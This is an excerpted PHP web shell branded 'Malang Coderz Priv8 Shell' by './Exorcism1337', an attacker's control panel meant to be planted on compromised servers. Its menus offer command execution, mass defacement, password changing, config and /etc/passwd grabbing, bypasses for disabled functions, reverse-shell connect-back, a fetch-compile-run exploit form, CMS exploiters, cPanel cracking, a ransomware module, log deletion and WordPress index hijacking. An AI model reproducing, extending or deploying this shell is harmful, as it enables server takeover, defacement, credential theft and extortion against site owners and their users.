...
function windisk()
{
	...
	foreach (range("A", "Z") as $letter) {
		...
		if ($bool) {
			$letters .= "[ <a class = 'ajx' href='?dir=$letter:\\'" . ($isdiskette ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"" : "") . ">";
			if ($letter . ":" != $v) {
				$letters .= $letter;
			} else {
...
for ($i = 0; $i < $___; $i++) {
	...
	<head>
		...
		<title>&#1203;&#824;&#1202;&#824;&#1203; ./Exorcism1337 &#1203;&#824;&#1202;&#824;&#1203;</title>
	...
	<body style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black>
		<style type="text/css">
		...
		<style type="text/css">
			...
			a:hover {
				cursor: url(http://cur.cursors-4u.net/cursors/cur-2/cur116.cur), wait;
			}
			...
			hr {
				border: 0;
				height: 1px;
				background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgb(0, 255, 0), rgba(0, 0, 0, 0))
			}
		</style>
		...
		<div class="container">
			...
			<div class="y x">
				<a href="?" class="ajx">
					<font color="lime">Malang Coderz Priv8 Shell</font>
				</a>
			</div>
			<nav class="navbar navbar-expand-lg navbar-dark ">
				...
				<a class="navbar-brand" href="#">
					<img src="http://icons.iconarchive.com/icons/hopstarter/malware/256/Spy-icon.png" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe">
				</a>
				<div class="collapse navbar-collapse" id="navbarNav">
					<ul class="navbar-nav">
						<li class="nav-item active">
							<a class="nav-link ajx" href="?">
								<font color="lime">Home</font>
							</a>
						</li>
						<li class="nav-item active">
		...
		<div class="u">
			...
			<form method="post" enctype="multipart/form-data">
				<label class="l w"><br>
					<input type="file" name="n[]" onchange="this.form.submit()" multiple class="inputzbut mr-3">
				</label>&nbsp;
			</form>
		...
		echo "<br><br>";
		echo '<a class="inputzbut btn ml-3 ajx" href="?d=' . hex($d) . '&n">+NEWFILE+</a>
						  <a class="inputzbut btn ajx " href="?d=' . hex($d) . '&l">+NEWDIR+</a>';
		echo "<form method='post'><center>
				<font color = 'lime'>" . $user . "@" . gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $ </font>&nbsp;
				<input style='border: none; border-bottom: 1px solid lime;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid lime;' type='submit' name='do_cmd' value='>>'>
				</center></form>";
		if ($_POST['do_cmd']) {
		...
		$a_ = '<table border="1" style="border-color:#000"class="explore">
						<thead>
							<tr>
								<th>';
		$b_ = '</th>
		...
		$d_ = '<br />
										<br />
										<input type="submit" class="inputzbut col-md-3" value="&nbsp;OK&nbsp;" />
									</form>';


		if (isset($_GET["s"])) {
			echo $a_ . uhex($_GET["s"]) . $b_ . '
									<textarea readonly class = "output">' . $GNJ[15]($GNJ[6](uhex($_GET["s"]))) . '</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d=' . $_GET["d"] . '&e=' . $_GET["s"] . '\'" type="submit" class="inputzbut col-md-3" value="&nbsp;EDIT&nbsp;" />
								' . $c_;
		} elseif (isset($_GET["y"])) {
			echo $a_ . 'REQUEST' . $b_ . '
									<form method="post">
										<input class="inputz md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
										<input class="inputz md-3" type="text" name="2" autocomplete="off" />
										' . $d_ . '
									<br />
									<textarea readonly class = "inputz">';
			...
			echo $a_ . uhex($_GET["e"]) . $b_ . '
									<form method="post">
										<textarea name="e" class="output">' . $GNJ[15]($GNJ[6](uhex($_GET["e"]))) . '</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<center><select id="b64" name="b64" class = "inputz col-md-3">
			...
			echo $a_ . uhex($_GET["t"]) . $b_ . '
									<form action="" method="post"><br>
										<input name="t" class="inputz col-md-3" autocomplete="off" type="text" value="' . $GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))) . '">
										' . $d_ . '
								' . $c_;
			if (!empty($_POST["t"])) {
				$p = $GNJ[33]($_POST["t"]);
			...
			echo $a_ . uhex($_GET["k"]) . $b_ . '
									<form action="" method="post"><br>
										<input name="b" autocomplete="off" class="inputz col-md-3" type="text" value="' . $GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4) . '">
										' . $d_ . '
								' . $c_;
			if (!empty($_POST["b"])) {
				$x = $_POST["b"];
			...
			echo $a_ . '+DIR' . $b_ . '
									<form action="" method="post"><br>
										<input name="l" autocomplete="off" class="inputz col-md-3" type="text" value="">
										' . $d_ . '
								' . $c_;
			if (isset($_POST["l"])) {
				if (!$GNJ[11]($_POST["l"])) {
	...
	MySQL : ' . $mysql . ' | MSSQL : ' . $mssql . ' | PostgreSQL : ' . $pgsql . ' | Perl : ' . $perl . ' | Python : ' . $python . ' | Ruby : ' . $ruby . ' |  WGET : ' . $wget . ' | cURL : ' . $curl . ' | Magic Quotes : ' . $magicquotes . ' | SSH2 : ' . $ssh2 . ' | Oracle : ' . $oracle . ' 
			...
			echo "
						<h2><center>Mass Tools Malang Coderz Priv8 Shell</center></h2>
						<br>
						<form method = 'POST'>
						<center>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('mass_tool') . "' style='width: 250px;' height='10'><center>Mass Deface / Delete Files</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('mass_user') . "' style='width: 250px;' height='10'><center>Mass User Changer</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('mass_title') . "' style='width: 250px;' height='10'><center>Mass Title Changer</center></a>
						</div>
			...
			echo "<br>";
			echo "<center>
						<h2> Symlink Malang Coderz Priv8 Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink' class = 'inputzbut btn' value = 'Symlink' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink2' class = 'inputzbut btn' value = 'Symlink 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink_py' class = 'inputzbut btn' value = 'Symlink Python' style='width: 250px;' height='10'>
						</div>
			...
			if (isset($_POST['symlink'])) {
				...
				echo "<br><br><center><h2>Symlink Malang Coderz Priv8 Shell</h2></center><br><br><center><div class=content>";
						...
						if (eregi('zone', $subject)) {
							...
							if (strlen(trim($string[1][0])) > 2) {
								...
								if (
									...
									$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px lime; '>" . $string[1][0] . '</div>';
								}
								echo "
			<tr>
...
';
							...
							@fclose($fp3);
							echo "
 <h2><center>Symlink2 Malang Coderz Priv8 Shell</center></h2>
 <table align=center border=1><tr>
 ...
 <td align=center><font class=txt>" . $matches . "</td>";
			...
			if ($_POST) {
				...
				echo "<br><center>";
				echo "<h2>Config Grabber Malang Coderz Priv8 Shell</h2>";
				echo "<form method=\"post\" action=\"\"><center>etc/passwd ( Error ? <a class = 'ajx' href='?d=$baru&$baru2'>Bypass Here</a> )<br><textarea name=\"passwd\" class='output' rows='15' cols='60'>\n";
				echo file_get_contents('/etc/passwd');
				echo "</textarea><br><br><input type=\"submit\" value=\"Grab\" class = 'inputzbut' style='width:250px;'></td></tr></center>\n";
				echo "<br>";
			}
		...
		?>
			<br>
			<center>
				<h2>Netsploit Malang Coderz Priv8 Shell</h2>
				<table class="tabnet">
					<tr>
						<th>Port Binding</th>
						<th>Connect Back</th>
					...
					<tr>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>Port <br><br><br> Password<br><br><br><br></td>
						...
						<td>
							<table>
								<form method="post">
									<tr>
										<td>IP<br><br><br>Port<br><br><br><br></td>
										<td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="inputz" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:100px"></td>
									</tr>
							...
							<table>
								<form method="post">
									<tr>
										...
										<td><input class="inputz" type="text" name="wurl" style="width:220px;" value="www.some-code/exploits.c"><br><br><input class="inputz" type="text" name="wcmd" style="width:220px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="inputz" name="pilihan">
		...
		<?php
			...
			echo "<br>";
			echo "<center>
						<h2> CGI Malang Coderz Priv8 Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi' class = 'inputzbut btn' value = 'CGI Perl' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi2' class = 'inputzbut btn' value = 'CGI Perl 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgipy' class = 'inputzbut btn' value = 'CGI Python' style='width: 250px;' height='10'>
						</div>
			...
			if ($_POST['mass'] == 'onedir') {
				echo "<br> Versi Text Area<br><textarea class = 'output' name='index' rows='10' cols='67'>\n";
				$ini = "http://";
				...
				echo "
		<br>
		<center><h2>Mass Deface / Delete Files Malang Coderz Priv8 Shell</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"inputz\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		...
		<input class= 'inputz' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10' autocomplete = 'off'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input class= 'inputz' type='text' name='d_file' value='Exc.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea class= 'output' name='script' style='width: 450px; height: 200px;'>Hacked By ./Exorcism1337</textarea><br><br>
		<input class= 'inputzbut' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center><br>";
			}
			...
			if ($_POST['hajar']) {
				...
				print "<center>
				<h2>Mass User Changer Malang Coderz Priv8 Shell</h2>
				<form method='post'>
				...
				<input class='inputz' type='text' size='50' name='config_dir' style='width:250px;' height = '10' class='inputz' value='" . path() . "'><br><br>
				Set User & Pass: <br>
				<input class='inputz' type='text' style='width:250px;' height = '10' class='inputz' name='user_baru' value='Exorcism1337' placeholder='user_baru'><br><br>
				<input class='inputz' type='text' style='width:250px;' height = '10' class='inputz' name='pass_baru' value='Exorcism1337' placeholder='pass_baru'><br><br>
				<input class = 'inputzbut' style='width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
				</form></center><br>";
			}
		} elseif (isset($_GET[hex('mass_title')])) {
			echo "<br><center><h2>Mass Title Changer Malang Coderz Priv8 Shell</h2>
<form method='post'>
Link Config: <br>
<input type='text' class = 'inputz' height='10' name='linkconf' height='10' style='width: 450px;' placeholder='http://website.com/ia_symconf/'><br><br>
<input type='submit' class = 'inputzbut' height='10' style='width: 450px;' name='gass' value='Hajar!!' class='oke'>
</form></center><br>";
			if ($_POST['gass']) {
				echo "<center>
<form method='post'>
...
<textarea name='link'>";
				...
				echo "</textarea><br>ID: <input class = 'inputz'  type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Index_Attacker'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Index_Attacker'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Index_Attacker'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
			...
			echo "<br>";
			echo "<center><h2>Bypasser Malang Coderz Priv8 Shell</h2></center><br>";
			echo "
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('bypass-cf') . "' style='width: 250px;' height='10'><center>Bypass CloudFlare</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('bypass-server') . "' style='width: 250px;' height='10'><center>Bypass Server</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('bypass-vhost') . "' style='width: 250px;' height='10'><center>Bypass Vhost</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('bypass-passwd') . "' style='width: 250px;' height='10'><center>Bypass Passwd</center></a>
						</div>
						</div>";
			echo "";
			...
			echo '
				...
				<h2>Bypass CloudFlare Malang Coderz Priv8 Shell</h2>
				<select class="inputz btn" name="krz">
					<option>ftp</option>
						<option>direct-connect</option>
							<option>webmail</option>
								<option>cpanel</option>
				</select>
				<input class="inputz btn" type="text" name="target" value="url">
				<input class="inputzbut" type="submit" value="Bypass">
				</center>
				<br>
				</form>
		...
		?>
			<form method="post">
				<center><br />
					...
					<h2>Bypass Server Malang Coderz Priv8 Shell</h2>
				</center><br>
				<?php
				print '
<form method="POST" action=""><br><center>
<b><font color=white><b><font color="grey">Command : </font></font></b>
<div class = "col-md-4">
<input name="baba" type="text" class="inputz" style="width:250px;" size="34">&nbsp;
</div>
<br>
<div class = "col-md-4">
<input type="submit" class="inputzbut" value="Execute!" style="width:350px;">
<br>
</div>
</form><br>
<form method="POST" action=""><strong><b><font color="grey">Menu Bypass : </font></strong><br>
<select name="liz0" size="1" class="inputz" style="width:250px;">
...
</select> <br><br><input type="submit" class="inputzbut" style="width:350px;" value="Bypass!">
</form>
<br></center>
';
			...
			echo "<center><input type='submit' value='Bypass it' name='Colii' class = 'inputzbut' style='width:250px;'></center>";
	...
	Bypassed Successfully</b></font></a>";
			...
			echo '<center><h2>Bypass Etc/Passwd </h2><br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" class = "inputz btn" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" class = "inputz btn" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" class = "inputz btn" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" class = "inputz btn" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" class = "inputz btn" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>
<br>
<h2>Bypass User</h2><table style="width:50%"><br>
<tr>
    <td><form method="post"><input type="submit" class = "inputz btn" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" class = "inputz btn" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" class = "inputz btn" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" class = "inputz btn" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" class = "inputz btn" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


			if ($_POST['awkuser']) {
				echo "<textarea class='output' cols='65' rows='15'>";
			...
			echo "<br>";
			echo "<center><h2>Exploiter Malang Coderz Priv8 Shell</h2></center><br>";
			echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('csrf') . "' style='width: 250px;' height='10'><center>CSRF Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('revslider') . "' style='width: 250px;' height='10'><center>Revslider Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('elfinder') . "' style='width: 250px;' height='10'><center>Elfinder Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'inputz btn ajx' href = '?d=" . hex($d) . "&" . hex('drupal') . "' style='width: 250px;' height='10'><center>Drupal Exploiter</center></a>
						</div>
			...
			echo '
<br><center><h2 style="font-size:33px;">CSRF Exploiter Malang Coderz Priv8 Shell</h2><br><br>
...
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px; width:450px;" class = "inputz" required autocomplete = "off"><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px; width:250px;" required class = "inputz" autocomplete = "off"><br>
<input style="width:350px;" type="submit" name="d" value="Lock!" class = "inputzbut">
</form><br>';
			$url = $_POST["url"];
			$pf = $_POST["pf"];
			$d = $_POST["d"];
...
<center><br>
<h2>Revslider Exploiter Malang Coderz Priv8 Shell</h2>
<form method='post'>
<textarea class='output' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='inputzbut' type='submit' style='width: 150px;' name='sikat' value='Gass!'>
</form></center><br>
";
...
", $co);
			...
			echo '<form method="post">
Target: <br>
<textarea class = "output" name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input class = "inputzbut" type="submit" name="x" style="width: 150px; height: 35px; margin: 5px;" value="SIKAT!">
</form></center><br>';
...
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
		...
		<textarea rows='10'class='output' cols='10' name='url'>
http://www.site.com
http://www.site2.com</textarea><br><br>
		<input type='submit' class='inputzbut' style='width:250px;' name='submit' value='SIKAT!'>
		</form></center><br>
		";
			$drupal = ($_GET["drupal"]);
			if ($drupal == 'drupal') {
...
", $_POST['url']);
			...
			echo '<center><h2>Auto Tools Malang Coderz Priv8 Shell </h2><br>

<table style="width:100%">
  <tr>
  <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("zone-h") . '><center>Zone H</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("defacer-id") . '><center>Defacer ID</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("jumping") . '><center>Jumping</center></a></td>	
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("fake-root") . '><center>Fake Root</center></a></td>	
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("adminer") . '><center>Adminer</center></a></td>
</tr>
<tr>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("wp-hijack") . '><center>Wp Auto Hijack</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("cpanel-reset") . '><center>Cpanel Reset</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("zip-menu") . '><center>Zip Menu</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("reverse-ip") . '><center>Reverse IP</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("rdp") . '><center>K-RDP Shell</center></a></td>
</tr>
<tr>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("ransomware") . '><center>Ransomware</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("whois") . '><center>WhoIs</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("phpinfo") . '><center>Php Info</center></a></td>	
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("inject-code") . '><center>Inject Code</center></a></td>	
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("db-dump") . '><center>DB Dump</center></a></td>
</tr>
<tr>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("cp-crack") . '><center>Cpanel Crack</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("smtp-grab") . '><center>SMTP Grabber</center></a></td>	
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("domains") . '><center>Domains Viewer</center></a></td>
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("whmcs-decoder") . '><center>WHMCS Decoder</center></a></td>	
    <td><a style="width: 200px;" class = "inputz ajx btn" href = ?d=' . hex($d) . '&' . hex("delete-logs") . '><center>Delete Logs</center></a></td>
</tr>
</table>
<br>';
			...
			?>
				<form action="" method="post">
					<center>
						<br>
						<h2>Zone H Submit Malang Coderz Priv8 Shell</h2>
						<u>Defacer :</u><br>
						<input type="text" name="defacer" style="width: 250px; height: 30px;" value="./Exorcism1337" class="inputz" />
						<br><br>
						<u>Attacks Method :</u><br>
						<select name="hackmode" class="inputz" style="width: 250px; height: 40px;">
						...
						<br><br>
						<u>Reasons :</u><br>
						<select name="reason" class="inputz" style="width: 250px; height: 40px;">
						...
						<br><br>
						<textarea class="output" name="domain" style='display:block;width:25%;height:150px;'>List Of Domains</textarea>
						<p>(1 Domain Per Lines)</p>
						<input type="submit" class="inputzbut" style="width: 250px; height: 40px;" value="Send Now !" name="SendNowToZoneH" />
				</form>
				</center>
			...
			echo "<br><center>
		<h2>Defacer ID Submit Malang Coderz Priv8 Shell</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'inputz' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='./Exorcism1337'><br>
		<u>Team</u>: <br>
		<input class = 'inputz' style='width:250px; height:40px;' type='text' name='tim' size='50' value='Malang Coderz'><br>
		<u>Domains</u>: <br>
		<textarea class = 'output' style='width: 450px; height: 150px;' name='sites'></textarea><br><br>
		<input  class = 'inputzbut' style='width:250px; height:40px; 'type='submit' name='go' value='Submit'>
		</form><br>";
			$site = explode("\r\n", $_POST['sites']);
			$go = $_POST['go'];
			$hekel = $_POST['hekel'];
			...
			echo "<br><center><h2>Jumping Malang Coderz Priv8 Shell</h2>";
			echo "<form method = 'POST' action = ''>";
			echo "<input type = 'submit' name = 'jump' class='inputzbut' style='width:250px;height:40px;' value = 'Jump!'> ";
			echo "<br></center>";
			...
			if ($_POST['reverse']) {
				...
				echo "<br><center><h2>Fake Root Malang Coderz Priv8 Shell</h2><form method='post'>
		Filename: <br><input class='inputz' type='text' name='file' value='deface.html' style='width:300px;height:40px;'><br>
		User: <br><input class='inputz' type='text' value='$user' size='50' height='10' readonly style='width:300px;height:40px;'><br>
		Domain: <br>
		<textarea class='output' style='width: 450px; height: 250px;' name='url'>";
				reverse($_SERVER['HTTP_HOST']);
				echo "</textarea><br>
		<input class='inputzbut' type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><br>";
			}
		} elseif (isset($_GET[hex('adminer')])) {

			echo "<br>";
			echo "<center><h2>Adminer Malang Coderz Priv8 Shell</h2>";
			echo "<input type='submit' class='inputzbut' value='Spawn Adminer' style='width:250px;height:40px;' name='do_adminer'></center>";
			echo "<br>";
			...
			if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
                ...
                ";
					...
					echo "<br><center>";
					echo "<h2>RDP Malang Coderz Priv8 Shell</h2>";
					echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='inputz' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='Exorcism1337' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='inputz' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='Exorcism1337' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
            <input class ='inputzbut' style = 'width:250px;height:40px;' type='submit' name='create' value='Gass'>
            </div>
            </div>
            </form><br>
            -- Option --<br>
            ...
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <input class ='inputz' style = 'width:250px;height:40px;' type='text' name='r_user' placeholder='username' required>
            </div>
            <div class = 'col-md-4'>
            <select name='opsi' class ='inputz' style = 'width:250px;height:40px;'>
            ...
            <div class = 'col-md-4'>
            <input type='submit' name='s_opsi' value='Cek' class ='inputzbut' style = 'width:250px;height:40px;'>
            </div>
            </div>
            </form><br>
            ";
...
<h2>Wordpress Hijack Index Malang Coderz Priv8 Shell</h2><br>
<center>
<div class = "row clearfix ml-5">
<div class= "col-md-2">
<input class="inputz" type="text" value="localhost" name="pghost">
</div>
<div class= "col-md-2">
<input class="inputz" type="text" value="database_name" name="dbnmn">
</div>
<div class= "col-md-2">
<input class="inputz" type="text" value="prefix" name="prefix">
</div>
<div class= "col-md-2">
<input class="inputz" type="text" value="username_db" name="dbusrrrr">
</div>
<div class= "col-md-2">
<input class="inputz" type="text" value="password_db" name="pwddbbn"></center><br>
</div>
</div>
<center><textarea class="output" name="pown" cols="85" rows="10"><meta http-equiv="refresh" content="0;URL=http://pastebin.com/raw.php?i=WG1zASMG"></textarea><br><br>
<input style="width:250px;height:40px;" class="inputzbut" type="submit" name="up2" value="Hijack Index"><br></center><form><br>';
			$pghost = $_POST['pghost'];
			$dbnmn = $_POST['dbnmn'];
		...
		<br>
         <center>
         <h2>Cpanel Reset Malang Coderz Priv8 Shell</h2>
         <br><br>
         
  	
  	    <form action="" method="post">
  	    <b> Email : </b>
  	<input type="email" name="email" class = "inputz" style = "width:250px; height:40px;" autocomplete="off"  />
  	<br><br>
  	<input type="submit" name="submit" value="Reset Password!" class = "inputzbut" style = "width:250px; height:40px;" />
...
<label>Zip File : <input type="file" class="inputz" name="zip_file" /></label><br>
<input type="submit" class="inputzbut" style="width:250px;" name="submit" value="Upload And Unzip" />
</form><br><br>';
			if ($message) echo "<p>$message</p>";
			echo "<h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input class='inputz' type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input class='inputz' type='text' name='save' value='$dir/Exorcism_backup.zip' style='width: 450px;' height='10'><br><br>
<input class='inputzbut' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
			if ($_POST['backup']) {
				$save = $_POST['save'];
    ...
    <input class='inputz' type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='inputz' type='text' name='save' value='$dir/Exorcism_unzip' style='width: 450px;' height='10'><br><br>
    <input class='inputzbut' type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    ";
			if ($_POST['extrak']) {
				$save = $_POST['save'];
				$zip = new ZipArchive;
			...
			?>
				...
				<center>
					<h2>Reverse IP Malang Coderz Priv8 Shell</h2>
					<a style="width: 250px;" class="inputz btn" onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER['SERVER_ADDR']; ?>">[ Reverse IP Lookup ] </a>
				</center>
				<br>
...
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 ...
 #Ransomware Ini Berada Pada [dir]: <?php echo
    ...
    <br />
	<div class="mybox">
	<h2>Whois Malang Coderz Priv8 Shell</h2>
	<form method="post"><table class="tabnet">
    <tr><td>Site to scan </td><td>:</td><td>
    <input type="text" name="site" size="50" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" name="scan" value="Scan !" /></td></tr>
    </table></form></div><br>';
					if (isset($_POST['scan'])) {
   ...
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
					...
					echo "<br>";
					echo '<center><h2>Mass Code Injector Malang Coderz Priv8 Shell</h2></center>';
        ...
        <center>
                <table align="center">
                    <tr><br>
                        <td>Directory : </td>
                        <td><input class = "inputz" type = "text" class="box" name="path" value="' . getcwd() . '" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select class = "inputz" style="width: 150px;" name="mode" class="box">
                    ...
                    <tr>
                        ...
                        <td><br>
                            <input class = "inputz" type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                         
                            <select class = "inputz" style="width: 150px;" name="type" class="box">
                    ...
                    <tr>
                        <td colspan="2"><textarea class = "output" name="code" style= "width:100%"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            ...
                            <input class = "inputzbut" style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    <br></tr>
                </table>
        </form>';
					}
...
<form action method=post>
<table class=tabnet >
<h2>Database Dumper Malang Coderz Priv8 Shell</h2>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52 autocomplete = "off"></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52 autocomplete = "off"></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52 autocomplete = "off"></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52 autocomplete = "off"></td></tr>
	<tr>
	<td>DB Type </td>
	...
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
					...
					if ($_POST['crack']) {
						...
						if ($i == 0) {
							...
							echo "<br>sukses nyolong " . $i . " Cpanel by <font color=lime>Malang Coderz Priv8 Shell.</font>";
						}
					} else {
						echo "<center><br>
		<form method='post'>
